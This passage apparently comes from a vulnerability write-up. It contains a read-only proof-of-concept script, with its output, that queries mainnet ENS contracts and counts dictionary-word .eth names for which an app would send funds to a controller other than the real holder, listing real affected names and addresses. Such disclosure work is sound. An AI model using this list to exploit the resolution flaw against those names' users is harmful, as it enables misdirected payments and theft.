 * names a person would plausibly type into a recipient field — which is the population
 * that matters here — and it is NOT a random sample of all 2LDs.
 *
 * Instrument: eth_call / multicall only. This RPC returns 403 for eth_getLogs, so no
 * result here depends on logs. Positive control printed first.
 *
 * Read-only against mainnet. Run from apps/portal.
 */
import { createPublicClient, http, keccak256, encodePacked, zeroAddress, parseAbi, toHex } from 'viem'
import { mainnet } from 'viem/chains'
import { readFileSync } from 'node:fs'

const RPC = process.env.RPC ?? 'https://ethereum-rpc.publicnode.com'
const REGISTRY = '0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e'
const REGISTRAR = '0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85'
const NAMEWRAPPER = '0xD4416b13d2b3a9aBae7AcD5D6C2BbDBE25686401'
const ETH_NODE = '0x93cdeb708b7545dc668eb9280176169d1c33cfd8ed6f04690a0bcc88a93fc4ae'
const N = Number(process.env.N ?? 1200)

const client = createPublicClient({ chain: mainnet, transport: http(RPC, { batch: true }) })
const REG = parseAbi(['function owner(bytes32) view returns (address)', 'function resolver(bytes32) view returns (address)'])
const RAR = parseAbi(['function ownerOf(uint256) view returns (address)'])
const RES = parseAbi(['function addr(bytes32) view returns (address)'])

const labelhash = (s) => keccak256(toHex(s))
const nodeOf = (s) => keccak256(encodePacked(['bytes32', 'bytes32'], [ETH_NODE, labelhash(s)]))

console.log(`mainnet block ${await client.getBlockNumber()}`)
console.log('POSITIVE CONTROL — a name known to be registered:')
{
  const r = await client.multicall({ contracts: [
    { address: REGISTRY, abi: REG, functionName: 'owner', args: [nodeOf('vitalik')] },
    { address: REGISTRAR, abi: RAR, functionName: 'ownerOf', args: [BigInt(labelhash('vitalik'))] },
  ], allowFailure: true })
  console.log(`  vitalik.eth  controller=${r[0].result}  holder=${r[1].result}  (both read OK: ${r[0].status}/${r[1].status})`)
}

// candidate labels: common English words, 4-12 chars, lowercase a-z only
const words = readFileSync('/usr/share/dict/words', 'utf8').split('\n')
  .map((w) => w.trim().toLowerCase())
  .filter((w) => /^[a-z]{4,12}$/.test(w))
const step = Math.floor(words.length / N)
const labels = Array.from({ length: N }, (_, i) => words[i * step]).filter(Boolean)
console.log(`\ncandidate labels sampled evenly from the dictionary: ${labels.length}`)

const CH = 50
const rows = []
for (let i = 0; i < labels.length; i += CH) {
  const b = labels.slice(i, i + CH)
  const calls = b.flatMap((l) => [
    { address: REGISTRAR, abi: RAR, functionName: 'ownerOf', args: [BigInt(labelhash(l))] },
    { address: REGISTRY, abi: REG, functionName: 'owner', args: [nodeOf(l)] },
    { address: REGISTRY, abi: REG, functionName: 'resolver', args: [nodeOf(l)] },
  ])
  const r = await client.multicall({ contracts: calls, allowFailure: true })
  b.forEach((l, k) => {
    const [h, c, rs] = [r[k * 3], r[k * 3 + 1], r[k * 3 + 2]]
    if (h.status !== 'success') return           // not registered / expired -> ownerOf reverts
    rows.push({ label: l, node: nodeOf(l), holder: h.result,
                controller: c.status === 'success' ? c.result : null,
                resolver: rs.status === 'success' ? rs.result : zeroAddress })
  })
  process.stdout.write(`\r  checked ${Math.min(i + CH, labels.length)}/${labels.length}, registered so far ${rows.length}   `)
}
console.log()

const withRes = rows.filter((x) => x.resolver && x.resolver !== zeroAddress)
for (let i = 0; i < withRes.length; i += CH) {
  const b = withRes.slice(i, i + CH)
  const r = await client.multicall({
    contracts: b.map((x) => ({ address: x.resolver, abi: RES, functionName: 'addr', args: [x.node] })),
    allowFailure: true })
  b.forEach((x, k) => { x.addr = r[k].status === 'success' ? r[k].result : zeroAddress })
}

const eq = (a, b) => a && b && a.toLowerCase() === b.toLowerCase()
const unwrapped = rows.filter((x) => !eq(x.holder, NAMEWRAPPER))
const noAddr = unwrapped.filter((x) => !x.addr || x.addr === zeroAddress)
const differ = unwrapped.filter((x) => x.controller && !eq(x.controller, x.holder))
const harmful = noAddr.filter((x) => x.controller && !eq(x.controller, x.holder))

console.log(`
=== MAINNET ENS — dictionary-word labels, ${new Date().toISOString().slice(0,10)} ===
  candidates tried                                      ${labels.length}
  registered right now                                  ${rows.length}
  held by the NameWrapper (excluded, .owner is correct)  ${rows.length - unwrapped.length}
  unwrapped                                             ${unwrapped.length}
  of unwrapped, NO addr record                          ${noAddr.length}  (${(noAddr.length/unwrapped.length*100).toFixed(1)}%)
  of unwrapped, controller != ERC-721 holder            ${differ.length}  (${(differ.length/unwrapped.length*100).toFixed(1)}%)
  BOTH -> the app substitutes a THIRD PARTY             ${harmful.length}  (${(harmful.length/unwrapped.length*100).toFixed(1)}%)
`)
console.log('the harmful bucket, mainnet, real names:')
harmful.slice(0, 20).forEach((x) =>
  console.log(`  ${(x.label + '.eth').padEnd(16)} app would send to ${x.controller}   real holder ${x.holder}`))
POCEOF

N=30000 node poc5.mjs
```

**Output.**

```
mainnet block 25795327
POSITIVE CONTROL — a name known to be registered:
  vitalik.eth  controller=0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045  holder=0x220866B1A2219f40e72f5c628B65D54268cA3A9D  (both read OK: success/success)

candidate labels sampled evenly from the dictionary: 30000

=== MAINNET ENS — dictionary-word labels, 2026-08-20 ===
  candidates tried                                      30000
  registered right now                                  4857
  held by the NameWrapper (excluded, .owner is correct)  536
  unwrapped                                             4321
  of unwrapped, NO addr record                          1018  (23.6%)
  of unwrapped, controller != ERC-721 holder            1257  (29.1%)
  BOTH -> the app substitutes a THIRD PARTY             371  (8.6%)

the harmful bucket, mainnet, real names:
  accordion.eth    app would send to 0xA8B4756959E1192042fC2a8A103Dfe2BdDF128E8   real holder 0x44A4212ac91767708Ce8a6e41a43f18181def77f
  adorable.eth     app would send to 0xae3C9636DE4005CB1a0c3aA94e53152A60330388   real holder 0x00E5F7a306DfD157740d24BfC40b749313d8D110
  arabic.eth       app would send to 0xAb48EdD90bdF367d326D827758BAcD2460c59d17   real holder 0x7FcE43C4015E227663ae3a970A093Ec8fa2ADA73
  ardor.eth        app would send to 0x772F61bb54Dbd1c9CDe9F8Ba11B02268235a2C25   real holder 0xE2Cf670Ffb5a6ED270D600fe66Ee36E4CB4F56F7
  ariel.eth        app would send to 0xAb48EdD90bdF367d326D827758BAcD2460c59d17   real holder 0xaAC9B0a1a753D02f957571a5C59f39604c4f68A1
  armadillo.eth    app would send to 0xbCBD4885EE8B2b74249C5AD9B8B668fb256a51B1   real holder 0x709Fd49a06Cdd751F14D94916896df5D891b0807
  arouser.eth      app would send to 0x0622808FBBF70645365d3Dd2c82B5280F018ee82   real holder 0x5A3b7f8686E3330bbBDC6DfcD295DD2Ad232B811
  arranger.eth     app would send to 0xA7960C9f044194B18aF5fB4631F4cA72D8C924A6   real holder 0x2D8c3f7B03b1cb521ea9B5Ed6812693BB10E3fAc
```

`/usr/share/dict/words` ships with macOS and most Linux distributions; any word list works — the sampling frame only needs to be stated, and it is: dictionary labels, not a uniform sample of all 2LDs.
